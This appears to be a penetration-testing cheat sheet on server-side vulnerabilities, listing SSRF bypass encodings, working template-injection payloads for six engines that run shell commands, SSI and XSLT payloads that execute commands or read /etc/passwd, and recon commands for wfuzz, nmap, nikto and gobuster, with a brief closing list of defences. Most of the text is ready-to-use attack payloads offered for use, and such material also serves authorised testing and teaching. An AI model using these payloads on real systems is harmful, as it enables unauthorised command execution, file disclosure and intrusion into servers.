# Server-side-vulnerabilities

## 1. Server-Side Request Forgery (SSRF)

### Exploitation

* Internal port scanning.
* Accessing internal-only or restricted endpoints.

### Common Protocols

* `http://127.0.0.1`
* `gopher://host:port/...`
* `dict://127.0.0.1:11211/info`
* `ftp://127.0.0.1:21`
* `file://`
* `php://`
* `data://`
* `https://`

### Bypass Techniques

* URL encoding: `127.0.0.1%3A80`
* Double encoding: `127.0.0.1%253A80`
* Octal/Hex IP formats
* IPv6: `[::1]`
* DNS rebinding
* Alternate ports

---

## 2. Server-Side Template Injection (SSTI)

### Detection

* Send a test string such as: `{{<%[%'"}}\.`

### Exploitation Examples

**Jinja2 (Python)**

```jinja
{{config.items()[4][1].__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP)**

```twig
{{system('id')}}
```

**Freemarker (Java)**

```java
${new java.lang.ProcessBuilder("id").start()}
```

**Velocity (Java)**

```velocity
#set($e="e")#set($x=$e.class.forName("java.lang.Runtime").getRuntime().exec("id"))$x
```

**Smarty (PHP)**

```smarty
{${system('id')}}
```

**Handlebars (JS)**

```handlebars
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
```

### Blind SSTI

* Timing checks
* Out-of-band interactions

---

## 3. Server-Side Includes (SSI) Injection

### Common Payloads

```html
<!--#echo var="HTTP_USER_AGENT" -->
<!--#exec cmd="id" -->
<!--#include file="/etc/passwd" -->
<!--#config errmsg="Error" -->
```

---

## 4. XSLT Injection

### Elements

* `<xsl:template>`
* `<xsl:value-of>`
* `<xsl:for-each>`
* `<xsl:if>`

### Payloads

**Information Disclosure**

```xml
<xsl:value-of select="system-property('xsl:version')" />
```

**Local File Inclusion**

```xml
<xsl:value-of select="unparsed-text('/etc/passwd','utf-8')" />
```

**Remote Code Execution**

```xml
<xsl:value-of select="php:function('system','id')" />
```

### Advanced Techniques

* XXE via XSLT
* SSRF via XSLT network fetches

---

## 5. Fuzzing & Reconnaissance Tools

### wfuzz

```bash
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ
```

### nmap

```bash
nmap -p 1-65535 target.com
```

### nikto

```bash
nikto -h target.com
```

### gobuster

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

---

## 6. Defensive Measures

* Input validation (whitelisting)
* Output encoding
* Isolation/sandboxing
* WAF protections
* Least privilege
* CSP rules
* Controlled error handling

---

## 7. API Security Considerations

* Block SSRF to metadata services.
* Limit template engine usage.
* Enforce authentication and authorization.

---

## 8. Modern Web Architecture

### Microservices

* Validate at API gateway.
* Restrictive permissions per service.

### Containers

* Minimize exposed ports.
* Use segmentation and proper network policies.
